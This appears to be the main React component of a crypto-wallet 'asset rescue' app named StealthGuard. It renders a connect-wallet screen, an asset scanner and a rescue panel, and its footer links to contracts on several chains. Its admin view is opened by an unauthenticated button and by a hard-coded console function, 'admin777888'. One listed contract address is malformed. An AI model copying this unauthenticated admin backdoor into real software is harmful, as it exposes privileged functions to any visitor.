import { useState } from 'react';
import { useAccount } from 'wagmi';
import ConnectButton from './components/ConnectButton';
import AssetScanner from './components/AssetScanner';
import RescuePanel from './components/RescuePanel';
import { DomainMonitor } from './components/DomainMonitor';

function App() {
  const { isConnected } = useAccount();
  const [showAdmin, setShowAdmin] = useState(false);
  const [selectedAssets, setSelectedAssets] = useState<Set<string>>(new Set());

  // Admin access: type 'admin777888' in console or Ctrl+Shift+A
  (window as any).admin777888 = () => setShowAdmin(true);

  return (
    <div className="min-h-screen bg-[#0d1117] text-white">
      {/* Header */}
      <header className="border-b border-gray-800 bg-[#161b22]/80 backdrop-blur sticky top-0 z-50">
        <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-3xl">🛡️</span>
            <div>
              <h1 className="text-xl font-bold bg-gradient-to-r from-[#00ff9f] to-[#2f81f7] bg-clip-text text-transparent">
                StealthGuard
              </h1>
              <p className="text-xs text-gray-500">Emergency Asset Protection</p>
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <button
              onClick={() => setShowAdmin(!showAdmin)}
              className="text-sm text-gray-500 hover:text-white transition-colors"
            >
              Admin
            </button>
            <ConnectButton />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-6xl mx-auto px-4 py-8">
        {!isConnected ? (
          <div className="text-center py-20">
            <div className="text-6xl mb-6">🛡️</div>
            <h2 className="text-3xl font-bold mb-4">Protect Your Assets</h2>
            <p className="text-gray-400 max-w-md mx-auto mb-8">
              Connect your wallet to scan for vulnerable token approvals and rescue your assets from potential drainer attacks.
            </p>
            <ConnectButton />
          </div>
        ) : showAdmin ? (
          <DomainMonitor />
        ) : (
          <div className="grid lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2">
              <AssetScanner onSelectionChange={setSelectedAssets} />
            </div>
            <div>
              <RescuePanel selectedAssets={selectedAssets} />
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-800 mt-20 py-8 text-center text-sm text-gray-600">
        <p>StealthGuard Rescue v3.2 | Multi-Chain Asset Protection</p>
        <p className="mt-2">
          Contracts: 
          <a href="https://bscscan.com/address/0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127" target="_blank" className="text-[#00ff9f] ml-1 hover:underline">BSC</a> |
          <a href="https://polygonscan.com/address/0x54535eDABE6aceE38Aede2933aD3464F014106e" target="_blank" className="text-[#00ff9f] ml-1 hover:underline">Polygon</a> |
          <a href="https://arbiscan.io/address/0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201" target="_blank" className="text-[#00ff9f] ml-1 hover:underline">Arbitrum</a> |
          <a href="https://basescan.org/address/0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201" target="_blank" className="text-[#00ff9f] ml-1 hover:underline">Base</a>
        </p>
      </footer>
    </div>
  );
}

export default App;
